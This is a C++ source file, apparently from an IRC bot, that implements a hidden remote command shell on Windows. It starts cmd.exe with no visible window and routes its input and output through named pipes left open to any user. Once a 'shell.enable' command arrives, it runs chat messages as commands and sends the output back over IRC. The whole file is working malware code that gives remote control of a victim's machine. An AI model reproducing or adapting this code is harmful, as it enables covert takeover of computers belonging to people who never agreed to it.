#include "main.h"
#include "mainctrl.h"
#include "cmdshell.h"
#include "cthread.h"

#ifdef _WIN32

CStdOut_Listen::CStdOut_Listen() { }
CStdOut_Listen::~CStdOut_Listen() { }

void *CStdOut_Listen::Run()
{	DWORD dwRead; char recvbuf[128]; int iSendBufIndex=0;
	char *szSendBuf=new char[sizeof(recvbuf)*16], *szTemp; while(m_bRunning)
	{	ReadFile(m_hStdOut, recvbuf, sizeof(recvbuf), &dwRead, NULL);
		memset(szSendBuf+iSendBufIndex, 0, dwRead+2);
		memcpy(szSendBuf+iSendBufIndex, recvbuf, dwRead); iSendBufIndex+=dwRead;
		if((szTemp=strstr(szSendBuf, "\r\n"))!=NULL || iSendBufIndex>(sizeof(recvbuf)*15))
		{	*(szTemp)='\x00'; iSendBufIndex=0;
			g_pMainCtrl->m_cIRC.SendFormat(m_pMessage->bSilent,
				m_pMessage->bNotice, m_pMessage->sReplyTo, "%s", szSendBuf);
			Sleep(1000); memset(szSendBuf, 0, sizeof(recvbuf)*16); } }
	delete [] szSendBuf; return NULL; }

CCmdShell::CCmdShell() {
	m_bEnabled=false; m_mMessage.bSilent=true;
	m_mMessage.bNotice=false; m_mMessage.sReplyTo.Assign(""); }

CCmdShell::~CCmdShell() {
	TerminateProcess(m_hProcess, 0);
	// while(WaitForSingleObject(m_hProcess, 0)==WAIT_TIMEOUT && m_pStdOut->IsRunning())
	// { TerminateProcess(m_hProcess, 0); Sleep(1000); }
	m_pStdOut->Kill(); m_pStdErr->Kill(); CloseHandle(m_hStdOut); CloseHandle(m_hStdErr); CloseHandle(m_hStdIn);
	CloseHandle(m_sinfo.hStdOutput); CloseHandle(m_sinfo.hStdError); CloseHandle(m_sinfo.hStdInput); }

void CCmdShell::Init()
{
	REGCMD(m_cmdFallBackHandler,	"shell.handler",	"FallBack handler for shell",	true,	this);
	REGCMD(m_cmdEnable,				"shell.enable",		"Enable shell handler",			true,	this);
	REGCMD(m_cmdDisable,			"shell.disable",	"Disable shell handler",		true,	this);

	char *command="cmd.exe";

	PROCESS_INFORMATION pinfo; SECURITY_ATTRIBUTES SecAttrib={0}; SECURITY_DESCRIPTOR SecDesc;
	InitializeSecurityDescriptor(&SecDesc, SECURITY_DESCRIPTOR_REVISION); SetSecurityDescriptorDacl(&SecDesc, true, NULL, false);
	
	SecAttrib.nLength=sizeof(SECURITY_ATTRIBUTES); SecAttrib.lpSecurityDescriptor=&SecDesc; SecAttrib.bInheritHandle=true;
	
	memset(&m_sinfo, 0, sizeof(STARTUPINFO));
	m_sinfo.dwFlags		|=	STARTF_USESTDHANDLES;	m_sinfo.hStdOutput	=	INVALID_HANDLE_VALUE;
	m_sinfo.hStdInput	 =	INVALID_HANDLE_VALUE;	m_sinfo.hStdError	=	INVALID_HANDLE_VALUE;
	m_sinfo.cb			 =	sizeof(m_sinfo);		m_sinfo.wShowWindow	=	SW_HIDE;
	char szStdOutPipe[MAX_PATH]=""; char szStdInPipe[MAX_PATH]=""; char szStdErrPipe[MAX_PATH]="";
	sprintf(szStdOutPipe, "\\\\.\\pipe\\exec-%s-stdout", command); sprintf(szStdInPipe, "\\\\.\\pipe\\exec-%s-stdin", command); sprintf(szStdErrPipe, "\\\\.\\pipe\\exec-%s-stderr", command);
	m_sinfo.hStdOutput=CreateNamedPipe(szStdOutPipe, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_MESSAGE|PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, (DWORD)-1, &SecAttrib);
	m_sinfo.hStdInput=CreateNamedPipe(szStdInPipe, PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE|PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, (DWORD)-1, &SecAttrib);
	m_sinfo.hStdError=CreateNamedPipe(szStdErrPipe, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_MESSAGE|PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0, 0, (DWORD)-1, &SecAttrib);
	if(m_sinfo.hStdOutput==INVALID_HANDLE_VALUE||m_sinfo.hStdError==INVALID_HANDLE_VALUE||m_sinfo.hStdInput==INVALID_HANDLE_VALUE) {
		CloseHandle(m_sinfo.hStdOutput); CloseHandle(m_sinfo.hStdError); CloseHandle(m_sinfo.hStdInput); return; }

	m_hStdOut=INVALID_HANDLE_VALUE; m_hStdIn=INVALID_HANDLE_VALUE; m_hStdErr=INVALID_HANDLE_VALUE;
	WaitNamedPipe(szStdOutPipe, NULL); WaitNamedPipe(szStdInPipe, NULL); WaitNamedPipe(szStdErrPipe, NULL);
	m_hStdOut=CreateFile(szStdOutPipe, GENERIC_READ, 0, &SecAttrib, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	m_hStdIn=CreateFile(szStdInPipe, GENERIC_WRITE, 0, &SecAttrib, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	m_hStdErr=CreateFile(szStdErrPipe, GENERIC_READ, 0, &SecAttrib, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if(CreateProcess(NULL, command, NULL, NULL, true, NORMAL_PRIORITY_CLASS|CREATE_NO_WINDOW, NULL, NULL, &m_sinfo, &pinfo))
	{	m_hProcess=pinfo.hProcess; m_pStdOut=new CStdOut_Listen; m_pStdErr=new CStdOut_Listen;
		m_pStdOut->m_hStdOut=m_hStdOut; m_pStdOut->m_pMessage=&m_mMessage; m_pStdOut->Start(true, false, false);
		m_pStdErr->m_hStdOut=m_hStdErr; m_pStdOut->m_pMessage=&m_mMessage; m_pStdErr->Start(true, false, false); }
}

bool CCmdShell::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("shell.enable")) {
		m_bEnabled=true; m_mMessage.sReplyTo=pMsg->sReplyTo;
		m_mMessage.bSilent=pMsg->bSilent; m_mMessage.bNotice=pMsg->bNotice;
		m_mMessage.bOutchan=pMsg->bOutchan; return true; }
	else if(!pMsg->sCmd.Compare("shell.disable")) {
		m_bEnabled=false; m_mMessage.sReplyTo.Assign("");
		m_mMessage.bSilent=true; m_mMessage.bNotice=false;
		m_mMessage.bOutchan=false; return true; }
	else if(m_bEnabled) {
		// FallBack handler starts here
		DWORD dwWritten; CString sBuffer; sBuffer.Format("%s\n", pMsg->sChatString.CStr());
		WriteFile(m_hStdIn, sBuffer.CStr(), (DWORD)sBuffer.GetLength(), &dwWritten, NULL);
	}

	return false; }


#endif // _WIN32
